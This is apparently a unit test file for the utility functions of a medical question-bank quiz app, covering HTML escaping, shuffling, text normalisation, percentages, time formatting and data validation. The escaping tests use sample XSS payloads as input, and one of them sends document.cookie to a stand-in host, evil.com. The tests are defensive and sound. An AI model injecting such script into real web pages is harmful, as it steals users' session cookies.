import { describe, it, expect } from 'vitest';
import {
  escapeHtml,
  shuffleArray,
  normalizeText,
  calculatePercentage,
  formatTime,
  validateQuestionBank,
} from '../docs/assets/js/utils.js';

describe('escapeHtml - XSS Prevention (SECURITY CRITICAL)', () => {
  it('should escape < > characters', () => {
    expect(escapeHtml('<script>alert("xss")</script>')).toBe(
      '&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;'
    );
  });

  it('should escape & character', () => {
    expect(escapeHtml('Tom & Jerry')).toBe('Tom &amp; Jerry');
  });

  it('should escape " character', () => {
    expect(escapeHtml('He said "hello"')).toBe('He said &quot;hello&quot;');
  });

  it('should escape \' character', () => {
    expect(escapeHtml("It's working")).toBe('It&#039;s working');
  });

  it('should handle empty string', () => {
    expect(escapeHtml('')).toBe('');
  });

  it('should handle null', () => {
    expect(escapeHtml(null)).toBe('');
  });

  it('should handle undefined', () => {
    expect(escapeHtml(undefined)).toBe('');
  });

  it('should handle multiple special characters', () => {
    const malicious = '<img src=x onerror="alert(\'xss\')" alt="Test & Demo">';
    const expected =
      '&lt;img src=x onerror=&quot;alert(&#039;xss&#039;)&quot; alt=&quot;Test &amp; Demo&quot;&gt;';
    expect(escapeHtml(malicious)).toBe(expected);
  });

  it('should handle numbers by converting to string', () => {
    expect(escapeHtml(123)).toBe('123');
  });

  it('should prevent script injection', () => {
    const result = escapeHtml('<script>fetch("evil.com?cookie="+document.cookie)</script>');
    expect(result).not.toContain('<script>');
    expect(result).toContain('&lt;script&gt;');
  });

  it('should prevent event handler injection', () => {
    const result = escapeHtml('<div onload="malicious()">');
    expect(result).not.toContain('onload="');
    expect(result).toContain('&quot;');
  });
});

describe('shuffleArray - Fisher-Yates Algorithm', () => {
  it('should return an array of the same length', () => {
    const original = [1, 2, 3, 4, 5];
    const shuffled = shuffleArray(original);
    expect(shuffled).toHaveLength(5);
  });

  it('should contain all original elements', () => {
    const original = [1, 2, 3, 4, 5];
    const shuffled = shuffleArray(original);
    expect(shuffled.sort()).toEqual([1, 2, 3, 4, 5]);
  });

  it('should not modify the original array', () => {
    const original = [1, 2, 3, 4, 5];
    const originalCopy = [...original];
    shuffleArray(original);
    expect(original).toEqual(originalCopy);
  });

  it('should handle empty array', () => {
    const result = shuffleArray([]);
    expect(result).toEqual([]);
  });

  it('should handle single element', () => {
    const result = shuffleArray([42]);
    expect(result).toEqual([42]);
  });

  it('should shuffle (probabilistic test)', () => {
    // Run shuffle many times, should not always get same result
    const original = [1, 2, 3, 4, 5];
    const results = new Set();

    for (let i = 0; i < 100; i++) {
      const shuffled = shuffleArray(original);
      results.add(shuffled.join(','));
    }

    // With 100 shuffles of 5 elements, we should get multiple different orderings
    // (not a rigorous test, but catches obvious bugs)
    expect(results.size).toBeGreaterThan(1);
  });
});

describe('normalizeText - Text Normalization', () => {
  it('should convert to lowercase', () => {
    expect(normalizeText('HELLO World')).toBe('hello world');
  });

  it('should trim whitespace', () => {
    expect(normalizeText('  hello  ')).toBe('hello');
  });

  it('should handle empty string', () => {
    expect(normalizeText('')).toBe('');
  });

  it('should handle null', () => {
    expect(normalizeText(null)).toBe('');
  });

  it('should handle undefined', () => {
    expect(normalizeText(undefined)).toBe('');
  });

  it('should convert numbers to string', () => {
    expect(normalizeText(123)).toBe('123');
  });

  it('should handle multiple spaces', () => {
    expect(normalizeText('hello     world')).toBe('hello     world');
  });
});

describe('calculatePercentage', () => {
  it('should calculate percentage correctly', () => {
    expect(calculatePercentage(50, 100)).toBe(50);
    expect(calculatePercentage(1, 3)).toBe(33);
    expect(calculatePercentage(2, 3)).toBe(67);
    expect(calculatePercentage(3, 3)).toBe(100);
  });

  it('should handle zero total', () => {
    expect(calculatePercentage(5, 0)).toBe(0);
  });

  it('should handle zero correct', () => {
    expect(calculatePercentage(0, 10)).toBe(0);
  });

  it('should round correctly', () => {
    expect(calculatePercentage(1, 6)).toBe(17); // 16.666... -> 17
    expect(calculatePercentage(1, 7)).toBe(14); // 14.285... -> 14
  });

  it('should handle null/undefined total', () => {
    expect(calculatePercentage(5, null)).toBe(0);
    expect(calculatePercentage(5, undefined)).toBe(0);
  });
});

describe('formatTime', () => {
  it('should format seconds to MM:SS', () => {
    expect(formatTime(90)).toBe('1:30');
    expect(formatTime(60)).toBe('1:00');
    expect(formatTime(0)).toBe('0:00');
    expect(formatTime(59)).toBe('0:59');
    expect(formatTime(125)).toBe('2:05');
    expect(formatTime(3661)).toBe('61:01');
  });

  it('should handle single-digit seconds with padding', () => {
    expect(formatTime(5)).toBe('0:05');
    expect(formatTime(65)).toBe('1:05');
  });

  it('should handle negative numbers', () => {
    expect(formatTime(-10)).toBe('0:00');
  });

  it('should handle non-numeric input', () => {
    expect(formatTime('invalid')).toBe('0:00');
    expect(formatTime(null)).toBe('0:00');
    expect(formatTime(undefined)).toBe('0:00');
  });

  it('should handle decimal seconds', () => {
    expect(formatTime(90.7)).toBe('1:30'); // Floors to 90
  });
});

describe('validateQuestionBank - Data Validation', () => {
  const validQuestionBank = {
    questionBank: {
      id: 'test-bank',
      title: 'Test Bank',
      questions: [
        {
          id: 1,
          title: 'Test Question',
          vignette: 'A patient presents...',
          questionText: 'What is the diagnosis?',
          answerChoices: [
            { letter: 'A', text: 'Option A', isCorrect: true },
            { letter: 'B', text: 'Option B', isCorrect: false },
          ],
          correctAnswer: 'A',
        },
      ],
    },
  };

  it('should validate a valid question bank', () => {
    const result = validateQuestionBank(validQuestionBank);
    expect(result.valid).toBe(true);
    expect(result.error).toBeUndefined();
  });

  it('should reject null data', () => {
    const result = validateQuestionBank(null);
    expect(result.valid).toBe(false);
    expect(result.error).toContain('Invalid data format');
  });

  it('should reject undefined data', () => {
    const result = validateQuestionBank(undefined);
    expect(result.valid).toBe(false);
    expect(result.error).toContain('Invalid data format');
  });

  it('should reject data without questionBank property', () => {
    const result = validateQuestionBank({ invalid: 'data' });
    expect(result.valid).toBe(false);
    expect(result.error).toContain('questionBank');
  });

  it('should reject data without questions array', () => {
    const result = validateQuestionBank({ questionBank: {} });
    expect(result.valid).toBe(false);
    expect(result.error).toContain('questions array');
  });

  it('should reject questions array with non-object', () => {
    const result = validateQuestionBank({
      questionBank: {
        questions: ['invalid', 'array'],
      },
    });
    expect(result.valid).toBe(false);
    expect(result.error).toContain('not an object');
  });

  it('should reject question missing id', () => {
    const result = validateQuestionBank({
      questionBank: {
        questions: [
          {
            title: 'Test',
            vignette: 'Test vignette',
          },
        ],
      },
    });
    expect(result.valid).toBe(false);
    expect(result.error).toContain('missing required field: id');
  });

  it('should reject question missing title', () => {
    const result = validateQuestionBank({
      questionBank: {
        questions: [
          {
            id: 1,
            vignette: 'Test vignette',
          },
        ],
      },
    });
    expect(result.valid).toBe(false);
    expect(result.error).toContain('missing required field: title');
  });

  it('should reject question missing both vignette and questionText', () => {
    const result = validateQuestionBank({
      questionBank: {
        questions: [
          {
            id: 1,
            title: 'Test',
          },
        ],
      },
    });
    expect(result.valid).toBe(false);
    expect(result.error).toContain('missing both vignette and questionText');
  });

  it('should accept question with only vignette', () => {
    const result = validateQuestionBank({
      questionBank: {
        questions: [
          {
            id: 1,
            title: 'Test',
            vignette: 'A patient presents...',
          },
        ],
      },
    });
    expect(result.valid).toBe(true);
  });

  it('should accept question with only questionText', () => {
    const result = validateQuestionBank({
      questionBank: {
        questions: [
          {
            id: 1,
            title: 'Test',
            questionText: 'What is the diagnosis?',
          },
        ],
      },
    });
    expect(result.valid).toBe(true);
  });

  it('should reject invalid answerChoices type', () => {
    const result = validateQuestionBank({
      questionBank: {
        questions: [
          {
            id: 1,
            title: 'Test',
            vignette: 'Test',
            answerChoices: 'not an array',
          },
        ],
      },
    });
    expect(result.valid).toBe(false);
    expect(result.error).toContain('answerChoices is not an array');
  });
});
